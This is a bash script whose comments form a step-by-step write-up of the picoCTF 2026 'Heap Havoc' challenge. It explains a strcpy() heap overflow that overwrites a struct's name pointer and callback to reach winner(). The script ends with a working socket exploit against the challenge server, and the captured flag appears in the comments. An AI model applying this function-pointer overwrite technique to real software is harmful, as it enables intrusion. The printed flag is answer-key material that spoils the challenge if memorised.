#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Heap Havoc
# Category: Binary Exploitation
# Difficulty: Medium
# Event: picoCTF 2026
# Author: YAHAYA MEDDY
#
# Description:
# "A seemingly harmless program takes two names as arguments, but there's a
# catch. By overflowing the input buffer, you can overwrite the saved return
# address and redirect execution to a hidden part of the binary that prints the
# flag."
#
# Given information from the challenge:
# Files: vuln, vuln.c
# Remote service: nc foggy-cliff.picoctf.net 56778
#
# Core lesson:
# This challenge looks like a classic stack smash from the description, but the
# real bug is a heap overflow caused by strcpy() writing past an 8-byte heap
# allocation.
#
# That matters because in real assessments the story around a bug can be
# misleading. The source code and memory layout tell the truth. When the code
# and the challenge text disagree, trust the code.
#
# Real-world analogy:
# Imagine a web application that says:
# "We sanitize uploads before storage."
# If the code still writes attacker-controlled bytes into the wrong object, the
# user-facing promise does not protect the system. We care about the actual data
# flow, not the marketing description.
#
# High-level attack plan:
# 1. Read the source and identify the vulnerable strcpy() calls.
# 2. Map the heap layout created by malloc().
# 3. Overflow the first name buffer into the second struct.
# 4. Replace i2->name with a safe writable address.
# 5. Replace i2->callback with winner().
# 6. Let the program perform the second strcpy() normally.
# 7. When execution reaches if (i2->callback), the binary jumps to winner() and
#    prints the flag.
#
# Step 1: Read the source code.
# Manual command:
# sed -n '1,220p' vuln.c
#
# Reason:
# The source shows two heap-allocated structs:
#
#   struct internet {
#       int priority;
#       char *name;
#       void (*callback)();
#   };
#
# and two tiny heap buffers:
#
#   i1->name = malloc(8);
#   i2->name = malloc(8);
#
# followed by:
#
#   strcpy(i1->name, argv[1]);
#   strcpy(i2->name, argv[2]);
#
# strcpy() does not stop at 8 bytes. It stops only when it sees a null byte.
# That means argv[1] can spill out of i1->name and start corrupting the heap
# objects that were allocated after it.
#
# Step 2: Confirm the hidden win function.
# Manual command:
# objdump -d vuln | sed -n '/<winner>:/,/^$/p'
#
# Reason:
# The binary contains a helper named winner() that opens flag.txt and prints it.
# The address in this build is:
# 0x080492b6
#
# In binary exploitation, finding a useful existing function is a very common
# strategy. Instead of injecting new code, we often redirect control flow into
# code the program already trusts.
#
# Step 3: Understand the heap layout.
# Manual command:
# gdb -q ./vuln
# Then set a breakpoint before the first strcpy() and inspect the malloc
# results.
#
# Reason:
# The allocations happen in this order:
# - i1 struct      (12 bytes)
# - i1->name       (8 bytes)
# - i2 struct      (12 bytes)
# - i2->name       (8 bytes)
#
# In the local run used during analysis, the heap looked like this:
#
#   i1       = 0x0804e1f0
#   i1->name = 0x0804e200
#   i2       = 0x0804e210
#   i2->name = 0x0804e220
#
# So the distance from i1->name to i2->callback is:
#   0x0804e218 - 0x0804e200 = 0x18
# which is 24 bytes.
#
# This is the most important exploitation idea in the challenge:
# we are not randomly "sending a long string."
# We are sending a carefully sized structure overwrite.
#
# Step 4: Avoid the common crash.
# Manual command:
# Think through what happens after the first overflow.
#
# Reason:
# A naive payload that overwrites only i2->callback usually crashes.
# Why?
# Because the program still executes:
#
#   strcpy(i2->name, argv[2]);
#
# before the callback is used.
#
# If the first overflow corrupts i2->name into an invalid pointer, the second
# strcpy() dereferences junk memory and the process dies before reaching the win
# function.
#
# This is a real-world exploit-development habit:
# it is not enough to corrupt control flow eventually.
# The target must survive all the steps between corruption and control transfer.
#
# Step 5: Choose a safe writable destination for i2->name.
# Manual command:
# objdump -h vuln
#
# Reason:
# We need i2->name to point somewhere writable so the second strcpy() can store
# argv[2] safely. A good fixed address in this non-PIE binary is .bss:
# 0x0804c040
#
# The bytes of that address are:
# 40 c0 04 08
# which contain no null byte, so they can live inside a command-line argument.
#
# This "no null bytes in argv" detail is another real exploit concept:
# the delivery mechanism matters. Some inputs let you send any byte value;
# command-line arguments do not.
#
# Step 6: Build the final overflow layout.
# Manual command:
# python3 - <<'PY'
# import struct
# payload = (
#     b'A' * 8 +                 # fill i1->name
#     b'B' * 8 +                 # walk over allocator metadata / gap
#     b'CCCC' +                  # overwrite i2->priority with harmless bytes
#     struct.pack('<I', 0x0804c040) +  # new i2->name -> writable .bss
#     struct.pack('<I', 0x080492b6)    # new i2->callback -> winner()
# )
# print(payload)
# PY
#
# Reason:
# The first 24 bytes move us from i1->name up to i2->callback:
#
#   offset 0x00: i1->name data
#   offset 0x08: chunk metadata / heap gap
#   offset 0x10: i2->priority
#   offset 0x14: i2->name
#   offset 0x18: i2->callback
#
# We intentionally replace:
# - i2->name with 0x0804c040 so strcpy(argv[2]) writes somewhere safe
# - i2->callback with winner() so the later indirect call prints the flag
#
# Step 7: Trigger the program.
# Manual command:
# python3 - <<'PY'
# import socket
# import struct
#
# payload1 = (
#     b'A' * 8 +
#     b'B' * 8 +
#     b'CCCC' +
#     struct.pack('<I', 0x0804c040) +
#     struct.pack('<I', 0x080492b6)
# )
# payload2 = b'DDDD'
#
# with socket.create_connection(('foggy-cliff.picoctf.net', 56778)) as s:
#     print(s.recv(4096).decode('latin1', 'replace'), end='')
#     s.sendall(payload1 + b' ' + payload2 + b'\\n')
#     print(s.recv(4096).decode('latin1', 'replace'), end='')
# PY
#
# Reason:
# The remote wrapper reads one line, splits it into two "names," and passes them
# as argv[1] and argv[2] to the binary.
#
# The first argument performs the heap corruption.
# The second argument is short and harmless; it just lands in .bss because we
# already replaced i2->name with that writable address.
#
# After both strcpy() calls finish, the program executes:
#
#   if (i2->callback) i2->callback();
#
# Since i2->callback now points at winner(), the flag is printed.
#
# Flag obtained:
# picoCTF{h34p_0v3rfl0w_adab761b}

host="${1:-foggy-cliff.picoctf.net}"
port="${2:-56778}"

python3 - "$host" "$port" <<'PY'
import re
import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

winner = 0x080492B6
safe_writable_bss = 0x0804C040

payload1 = (
    b"A" * 8 +
    b"B" * 8 +
    b"CCCC" +
    struct.pack("<I", safe_writable_bss) +
    struct.pack("<I", winner)
)
payload2 = b"DDDD"

with socket.create_connection((host, port), timeout=15) as s:
    _ = s.recv(4096)
    s.sendall(payload1 + b" " + payload2 + b"\n")

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

match = re.search(rb"picoCTF\{[^}]+\}", data)
if not match:
    raise SystemExit(data.decode("latin1", "replace"))

print(match.group(0).decode())
PY
